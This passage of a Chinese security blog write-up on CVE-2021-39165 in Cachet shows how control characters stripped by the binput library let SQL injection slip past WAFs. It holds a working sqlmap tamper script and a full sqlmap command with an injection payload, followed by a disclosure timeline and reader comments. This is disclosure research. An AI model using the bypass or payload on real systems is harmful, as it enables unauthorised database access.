+<p>在实战中，我遇到了一个比较棘手的问题，大量厂商使用了WAF，这让GET型的注入变得很麻烦。解决这个问题的方法还是回归到代码审计中，Cachet获取用户输入是使用<a href="https://github.com/GrahamCampbell/Laravel-Binput">graham-campbell/binput</a>，我在前面审计的时候发现其在获取输入的基础上会做一次过滤：</p>
+<div class="codehilite"><pre><span></span><code><span class="k">public</span> <span class="k">function</span> <span class="nf">get</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span> <span class="nv">$default</span> <span class="o">=</span> <span class="k">null</span><span class="p">,</span> <span class="nv">$trim</span> <span class="o">=</span> <span class="k">true</span><span class="p">,</span> <span class="nv">$clean</span> <span class="o">=</span> <span class="k">true</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="nv">$value</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">request</span><span class="o">-&gt;</span><span class="na">input</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span> <span class="nv">$default</span><span class="p">);</span>
+
+    <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">clean</span><span class="p">(</span><span class="nv">$value</span><span class="p">,</span> <span class="nv">$trim</span><span class="p">,</span> <span class="nv">$clean</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>跟进<code>clean()</code>我发现这个库最终对用户的输入做了一次处理：</p>
+<div class="codehilite"><pre><span></span><code><span class="k">protected</span> <span class="k">function</span> <span class="nf">process</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="nv">$str</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">removeInvisibleCharacters</span><span class="p">(</span><span class="nv">$str</span><span class="p">);</span>
+    <span class="c1">//...</span>
+<span class="p">}</span>
+
+<span class="k">protected</span> <span class="k">function</span> <span class="nf">removeInvisibleCharacters</span><span class="p">(</span><span class="nv">$str</span><span class="p">,</span> <span class="nv">$urlEncoded</span> <span class="o">=</span> <span class="k">true</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="nv">$nonDisplayables</span> <span class="o">=</span> <span class="p">[];</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$urlEncoded</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$nonDisplayables</span><span class="p">[]</span> <span class="o">=</span> <span class="s1">&#39;/%0[0-8bcef]/&#39;</span><span class="p">;</span>
+        <span class="nv">$nonDisplayables</span><span class="p">[]</span> <span class="o">=</span> <span class="s1">&#39;/%1[0-9a-f]/&#39;</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="nv">$nonDisplayables</span><span class="p">[]</span> <span class="o">=</span> <span class="s1">&#39;/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]+/S&#39;</span><span class="p">;</span>
+
+    <span class="k">do</span> <span class="p">{</span>
+        <span class="nv">$str</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="nv">$nonDisplayables</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$str</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="nv">$count</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="nv">$count</span><span class="p">);</span>
+
+    <span class="k">return</span> <span class="nv">$str</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p><code>removeInvisibleCharacters()</code>方法将输入中的所有控制字符给替换成空了。那么，这个特性可以用于绕过WAF。</p>
+<p>正常的注入语句会被WAF拦截：</p>
+<p><a href="../media/attachment/2021/08/29/df9e13c1-a22e-44bd-8cb4-f3f11bcdeb29.png"><img alt="image-20210725074120676.png" src="../media/attachment/2021/08/29/df9e13c1-a22e-44bd-8cb4-f3f11bcdeb29.c1e08ec657d4.png" /></a></p>
+<p>在关键字<code>OR</code>中间插入一个控制字符<code>%01</code>，即可绕过WAF正常注入了：</p>
+<p><a href="../media/attachment/2021/08/29/e1cecb16-df84-43ba-9a3f-df097a8fa99b.png"><img alt="image-20210725074208833.png" src="../media/attachment/2021/08/29/e1cecb16-df84-43ba-9a3f-df097a8fa99b.10b6b116949b.png" /></a></p>
+<p>我写了一个简单的SQLMap Tamper来帮我进行这个处理：</p>
+<div class="codehilite"><pre><span></span><code><span class="ch">#!/usr/bin/env python</span>
+
+<span class="kn">import</span> <span class="nn">re</span>
+<span class="kn">from</span> <span class="nn">lib.core.enums</span> <span class="kn">import</span> <span class="n">PRIORITY</span>
+
+<span class="n">__priority__</span> <span class="o">=</span> <span class="n">PRIORITY</span><span class="o">.</span><span class="n">LOWEST</span>
+<span class="n">KEYWORD_PATTERN</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;\b[a-zA-Z]{2,}\b&#39;</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">dependencies</span><span class="p">():</span>
+    <span class="k">pass</span>
+
+<span class="k">def</span> <span class="nf">tamper</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
+    <span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">    Add %01 to all the keyword</span>
+
+<span class="sd">    &gt;&gt;&gt; tamper(&quot;1 AND &#39;1&#39;=&#39;1&quot;)</span>
+<span class="sd">    &quot;1 A%01ND &#39;1&#39;=&#39;1&quot;</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+
+    <span class="n">payload_list</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    <span class="n">offset</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="k">for</span> <span class="n">g</span> <span class="ow">in</span> <span class="n">KEYWORD_PATTERN</span><span class="o">.</span><span class="n">finditer</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
+        <span class="n">start</span> <span class="o">=</span> <span class="n">g</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+        <span class="n">end</span> <span class="o">=</span> <span class="n">g</span><span class="o">.</span><span class="n">end</span><span class="p">()</span>
+        <span class="n">m</span> <span class="o">=</span> <span class="p">(</span><span class="n">start</span> <span class="o">+</span> <span class="n">end</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
+
+        <span class="n">payload_list</span><span class="o">.</span><span class="n">insert</span><span class="p">(</span><span class="n">offset</span> <span class="o">+</span> <span class="n">m</span><span class="p">,</span> <span class="s1">&#39;%01&#39;</span><span class="p">)</span>
+        <span class="n">offset</span> <span class="o">+=</span> <span class="mi">1</span>
+
+    <span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">payload_list</span><span class="p">)</span>
+</code></pre></div>
+
+<p>使用这个tamper：</p>
+<div class="codehilite"><pre><span></span><code><span class="nt">python</span> <span class="nt">sqlmap</span><span class="p">.</span><span class="nc">py</span> <span class="nt">-u</span> <span class="s2">&quot;https://target/api/v1/components?name=1&amp;1</span><span class="cp">[</span><span class="mi">0</span><span class="cp">]</span><span class="s2">=&amp;1</span><span class="cp">[</span><span class="mi">1</span><span class="cp">]</span><span class="s2">=a&amp;1</span><span class="cp">[</span><span class="mi">2</span><span class="cp">]</span><span class="s2">=&amp;1</span><span class="cp">[</span><span class="mi">3</span><span class="cp">]</span><span class="s2">=o%02r+%27a%27=%3F%20a%01nd%201=1)*+--+&quot;</span> <span class="nt">--tamper</span> <span class="nt">addinvisiblechars</span><span class="p">.</span><span class="nc">py</span> <span class="nt">-A</span> <span class="s2">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36&quot;</span>
+</code></pre></div>
+
+<p>简单提交了几个有Bug Bounty的厂商，均已得到了确认：</p>
+<p><a href="../media/attachment/2021/08/29/a5e1f589-2d84-4e37-b838-bfc3195fb7e4.png"><img alt="image-20210725080218029.png" src="../media/attachment/2021/08/29/a5e1f589-2d84-4e37-b838-bfc3195fb7e4.6388892d3633.png" /></a></p>
+<p><a href="../media/attachment/2021/08/29/5c444bf1-558f-4eb5-b008-8c52f5c2bf44.png"><img alt="image-20210725080309827.png" src="../media/attachment/2021/08/29/5c444bf1-558f-4eb5-b008-8c52f5c2bf44.f35bf47e5eed.png" /></a></p>
+<p><a href="../media/attachment/2021/08/29/1b98174b-82bc-47e2-a0c1-654c1d26bbc6.png"><img alt="image-20210829005620210.png" src="../media/attachment/2021/08/29/1b98174b-82bc-47e2-a0c1-654c1d26bbc6.45f51fd40bf5.png" /></a></p>
+<p><a href="../media/attachment/2021/08/29/d163291c-87c2-4183-bd47-a2150a948456.png"><img alt="image-20210725080620845.png" src="../media/attachment/2021/08/29/d163291c-87c2-4183-bd47-a2150a948456.0549bb96befa.png" /></a></p>
+<h2 id="_1"><a class="toclink" href="#_1">漏洞时间线</a></h2>
+<p>本文涉及的漏洞已经提交给Cachet官方，但是官方开发者不是很活跃，一直没有回应。在issue中找到了一个fork的厂商，相对比较活跃，也可以联系到维护人，于是以fork厂商的身份对漏洞进行了通报。</p>
+<p>以下是漏洞的生命时间线：</p>
+<ul>
+<li>Jul 19, 2021 - 漏洞发现</li>
+<li>Jul 20, 2021 - SQL注入提交给Laravel官方，Laravel并不认为是自己的问题</li>
+<li>Jul 19 ~ jul 30, 2021 - 对hakcerone、bugcrowd上的厂商进行测试，并提交漏洞</li>
+<li>Jul 27, 2021 - 漏洞提交给Cachet官方和Fork的维护者</li>
+<li>Jul 27, 2021 - 发现Fork的项目在此之前<a href="https://github.com/fiveai/Cachet/commit/27bca8280419966ba80c6fa283d985ddffa84bb6#diff-9626eda2bc97e66b7f41ff638a3c7fc8af5224bc93c8a7010569efc8683ef7e2">意外修复</a>过这个漏洞</li>
+<li>Aug 27, 2021, 01:36 AM GMT+8 - <a href="https://github.com/fiveai/Cachet/security/advisories/GHSA-79mg-4w23-4fqc">漏洞公告</a>发布，确认编号CVE-2021-39165</li>
+</ul>
+          </div>
+        </article>
+
+        
+          <h1 class="h1 color-main">赞赏</h1>
+          <div class="zan text-center">
+            <p>喜欢这篇文章？打赏1元</p>
+            <p class="m-0"><img src="../static/wx.jpg" width="280" alt=""></p>
+          </div>
+        
+
+        <div id="reply-list">
+          <h1 class="h1 color-main">评论</h1>
+          
+            
+              <div class="flex mb-2" id="comment-4442">
+                <div class="gravatar">
+                  <img src="../static/placeholder.jpg" width="40px" height="40px" alt="">
+                </div>
+                <div class="ps-2">
+                  <p class="comment-meta title">
+                    <a href="" target="_blank" rel="nofollow noopener">tastic</a>
+                    <time datetime="2023年5月8日 21:59" itemprop="datePublished">
+                      2023 五月 08 21:59
+                    </time>
+                    <a href="javascript:reply_to('4442', 'tastic')">回复</a>
+                  </p>
+                  <p class="comment-meta">师傅，“注释了抑制报错的逻辑”这块是哪块代码</p>
+                </div>
+              </div>
+              
+            
+              <div class="flex mb-2" id="comment-3869">
+                <div class="gravatar">
+                  <img src="../static/placeholder.jpg" width="40px" height="40px" alt="">
+                </div>
+                <div class="ps-2">
+                  <p class="comment-meta title">
+                    <a href="" target="_blank" rel="nofollow noopener">luo</a>
+                    <time datetime="2022年5月23日 18:20" itemprop="datePublished">
+                      2022 五月 23 18:20
+                    </time>
+                    <a href="javascript:reply_to('3869', 'luo')">回复</a>
+                  </p>
+                  <p class="comment-meta">注入的密码也不好解开！ 所以只能按注入提交的吧</p>
+                </div>
+              </div>
+              
+            
+              <div class="flex mb-2" id="comment-3753">
+                <div class="gravatar">
+                  <img src="https://secure.gravatar.com/avatar/0f0422eab3dd85f804b4272c1af5e8b5.jpg?s=100&amp;d=mm&amp;r=g" width="40px" height="40px" alt="">
+                </div>
+                <div class="ps-2">
+                  <p class="comment-meta title">
+                    <a href="" target="_blank" rel="nofollow noopener">77</a>
+                    <time datetime="2021年12月2日 10:08" itemprop="datePublished">
+                      2021 十二月 02 10:08
+                    </time>
+                    <a href="javascript:reply_to('3753', '77')">回复</a>
+                  </p>
+                  <p class="comment-meta">77</p>
+                </div>
+              </div>
+              
+            
+              <div class="flex mb-2" id="comment-3698">
+                <div class="gravatar">
+                  <img src="https://secure.gravatar.com/avatar/d9cd7566046ddb23a751c39aa42df546.jpg?s=100&amp;d=mm&amp;r=g" width="40px" height="40px" alt="">
+                </div>
+                <div class="ps-2">
+                  <p class="comment-meta title">
+                    <a href="https://money1.us" target="_blank" rel="nofollow noopener">马内</a>
+                    <time datetime="2021年9月20日 20:39" itemprop="datePublished">
+                      2021 九月 20 20:39
+                    </time>
+                    <a href="javascript:reply_to('3698', '%E9%A9%AC%E5%86%85')">回复</a>
+                  </p>
+                  <p class="comment-meta">网站每日ip 1千，交换友链，money1。us/521</p>
+                </div>
+              </div>
+              
+            
+              <div class="flex mb-2" id="comment-3694">
+                <div class="gravatar">
+                  <img src="https://secure.gravatar.com/avatar/0fdb14964decc151902bd71bfe39d74b.jpg?s=100&amp;d=mm&amp;r=g" width="40px" height="40px" alt="">
+                </div>
+                <div class="ps-2">
+                  <p class="comment-meta title">
+                    <a href="" target="_blank" rel="nofollow noopener">绘画</a>
+                    <time datetime="2021年9月7日 12:03" itemprop="datePublished">
+                      2021 九月 07 12:03
+                    </time>
+                    <a href="javascript:reply_to('3694', '%E7%BB%98%E7%94%BB')">回复</a>
+                  </p>
+                  <p class="comment-meta">发售</p>
+                </div>
+              </div>
+              
+            
+              <div class="flex mb-2" id="comment-3688">
+                <div class="gravatar">
+                  <img src="../static/placeholder.jpg" width="40px" height="40px" alt="">
+                </div>
+                <div class="ps-2">
+                  <p class="comment-meta title">
+                    <a href="" target="_blank" rel="nofollow noopener">aaa</a>
+                    <time datetime="2021年8月30日 18:27" itemprop="datePublished">
+                      2021 八月 30 18:27
+                    </time>
+                    <a href="javascript:reply_to('3688', 'aaa')">回复</a>
+                  </p>
+                  <p class="comment-meta">bug bounty最后是按注入而不是RCE提交的吗</p>
+                </div>
+              </div>
+              
+                
+                  <div class="child-node">
+              <div class="flex mb-2" id="comment-3690">
+                <div class="gravatar">
+                  <img src="https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&amp;d=mm&amp;r=g" width="40px" height="40px" alt="">
+                </div>
+                <div class="ps-2">
+                  <p class="comment-meta title">
+                    <a href="https://www.leavesongs.com" target="_blank" rel="nofollow noopener">phithon</a>
+                    <time datetime="2021年9月1日 11:46" itemprop="datePublished">
+                      2021 九月 01 11:46
+                    </time>
+                    <a href="javascript:reply_to('3690', 'phithon')">回复</a>
+                  </p>
+                  <p class="comment-meta">@aaa SQL注入</p>
+                </div>
+              </div>
+              
+            </div>
+                
+              
+            
+          
+        </div>
+
+        
+
+        <form method="post" enctype="multipart/form-data" action="#reply" id="reply" class="mb-4">
+          <div class="container-fluid px-0">
+            
+            <div class="row">
+              <div class="col">
+                <textarea name="content" cols="40" rows="6" required id="id_content">
+</textarea>
+              </div>
+            </div>
+            <div class="row gx-2">
+              <div class="col-4">
+                <input type="text" name="nickname" placeholder="昵称" maxlength="64" required id="id_nickname">
+              </div>
+              <div class="col-4">
+                <input type="text" name="email" placeholder="邮箱（可留空）" maxlength="254" id="id_email">
+              </div>
+              <div class="col-4">
+                <input type="text" name="url" placeholder="链接（可留空）" maxlength="200" id="id_url">
+              </div>
+            </div>
+          </div>
+          <div class="row">
+            <div class="col-4">
+              <div class="row gx-2" style="margin-top: 8px"><div class="col-6"><input autocomplete="off" id="id_captcha_1" name="captcha_1" type="text" placeholder="验证码" /> <input id="id_captcha_0" name="captcha_0" type="hidden" value="63df87e4cc21caad4591af5a813f59be321a8af3" />
+</div><div class="col-6">
+<img src="../captcha/image/63df87e4cc21caad4591af5a813f59be321a8af3/index.png" alt="captcha" class="captcha" /></div></div>
+            </div>
+          </div>
+          <div class="row">
+            <div class="col">
+              <input type="submit" class="ui-button ui-button-sgreen" value="提交">
+            </div>
+          </div>
+          <input type="hidden" name="archive" value="467" id="id_archive">
+          <input type="hidden" name="parent" id="id_parent">
+          <input type="hidden" name="csrfmiddlewaretoken" value="TmtLLGUtAEdC6FEEgdNnLdjUHG1VMP6HFURCjLvcY0rlEds2ieK8IGmZ23i6lriZ">
+        </form>
+      </div>
+    </div>
+    <div class="row justify-content-center">
+      <div class="col-lg-7 col-md-10 col-sm-12">
+        <footer class="footer mx-auto">
+  <div class="footer-left">
+    Copyright &copy; 2023 Powered by talkbook
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <li><a href="../index.html">首页</a></li>
+        <li><a href="../feed/index.rss" target="_blank">RSS订阅</a></li>
+        <li><a href="http://weibo.com/101yx" target="_blank">微博</a></li>
+        <li><a href="https://github.com/phith0n" target="_blank">项目</a></li>
+        <li><a href="../index.html">更换模板</a></li>
+      </ul>
+    </nav>
+  </div>
+</footer>
+      </div>
+    </div>
+  </div>
+
+<script src="https://cdn.staticfile.org/jquery/2.2.4/jquery.min.js"></script>
+<script src="../static/cactus/js/main%EF%B9%96v=2021102502.js"></script>
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-FF5KPQ1CZ6"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-FF5KPQ1CZ6');
+</script>
+
+  <script src="https://cdn.staticfile.org/fancybox/2.1.7/js/jquery.fancybox.min.js"></script>
+  <script>
+      $(document).ready(function () {
+          $(".content a").each(function (i, e) {
+              if (e.host != 'www.leavesongs.com') {
+                  e.target = '_blank';
+              }
+          });
+          $(".content img").each(function (i, e) {
+              if (e.parentNode.tagName.toUpperCase() != 'A') {
+                  $(e).wrap('<a href="' + escapeHtml(e.src) + '" class="fancybox"></a>');
+              } else {
+                  $(e.parentNode).addClass('fancybox');
+              }
+          });
+          $('.fancybox').fancybox();
+      })
+  </script>
+
+</body>
+</html>
